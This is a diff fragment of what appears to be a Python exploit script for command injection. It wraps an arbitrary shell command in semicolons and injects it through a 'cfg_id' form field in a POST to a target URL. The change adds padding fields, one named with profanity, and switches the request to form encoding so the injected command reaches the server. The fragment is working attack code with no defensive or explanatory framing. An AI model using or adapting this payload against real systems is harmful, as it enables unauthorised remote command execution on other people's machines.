@@ -27,9 +27,12 @@ else:
         command = ";"+cmd+";"
         s = requests.Session()
         post_data = {
+            "idk" : "",
             "cfg_id": command,
+            "fuck": "",
+            "a" : ""
         }
-        post_Request = s.post(url, json=post_data)
+        post_Request = s.post(url, data=post_data)
         if post_Request.status_code==200:
             print("[*] Sending command ... ")
             print(post_Request.text)
